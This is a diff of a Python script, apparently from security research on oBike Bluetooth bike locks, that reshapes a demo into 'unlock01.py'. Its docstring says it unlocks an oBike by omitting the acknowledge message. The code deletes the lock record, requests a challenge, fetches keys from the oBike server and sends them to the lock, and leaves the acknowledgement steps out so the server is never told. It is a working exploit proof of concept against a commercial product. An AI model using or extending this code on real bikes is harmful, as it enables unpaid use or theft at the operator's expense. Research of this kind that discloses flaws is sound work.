@@ -1,9 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+"""Demo 1: unlock oBike by omitting the acknowledge message;
+requires interaction with the oBike servers as well as a
+valid account.
+"""
+
 from bluepy.btle import Scanner, DefaultDelegate
 from obike.ble_client import BleClient
-from obike.ble_scanner import BleScanner
 from obike.http_client import HttpClient
 from obike.lockdb import LockDb
 from colorama import Fore, Back, Style
@@ -23,15 +27,15 @@ def unlock_bike(mac, iface=0, verify=False):
     c.connect()
 
     # [1] say hello to lock
-    res = c.hello()
+    res = c.get_lock_record()
     if len(res) > 5:
-        # if necessary, lock bike first
+        # if necessary, delete_lock_record first
         ts = struct.unpack('>I', res[10:14])[0]
         print "timestamp: %d" % ts
-        c.hello_lock_bike(ts)
+        c.delete_lock_record(ts)
 
     # [2] receive challenge
-    challenge = c.push_coords(8.5308422, 47.372763).encode('hex').upper()
+    challenge = c.get_challenge(8.5308422, 47.372763).encode('hex').upper()
     print "Challenge: %s" % challenge
 
     # [3], [4] get response from obike server
@@ -51,8 +55,8 @@ def unlock_bike(mac, iface=0, verify=False):
     res = h.unlock_pass(bikeno, challenge)['data']
 
     # [5] send response to lock
-    c.send_keys(res['encryptionKey'], res['serverTime']/1000,
-                res['keys'].decode('hex'))
+    c.send_response(res['encryptionKey'], res['serverTime']/1000,
+                    res['keys'].decode('hex'))
 
     # [6] TODO get acknowledgement from lock
     # [7] TODO send acknowledgement to obike server
@@ -62,7 +66,7 @@ def unlock_bike(mac, iface=0, verify=False):
 
 
 parser = argparse.ArgumentParser(
-    prog='scanner.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    prog='unlock01.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 parser.add_argument('-i', '--iface', help='hci interface number',
                     type=int, default=0)
 parser.add_argument('-m', '--macaddr', help='The mac address of the obike',
@@ -75,8 +79,6 @@ args = parser.parse_args()
 print "[+] using iface: ", args.iface
 print "[+] using macaddr: ", args.macaddr
 print "[+] using insecure connection: ", args.insecure
-
-scanner = BleScanner(args.iface)
 
 try:
     unlock_bike(args.macaddr, args.iface, args.insecure)
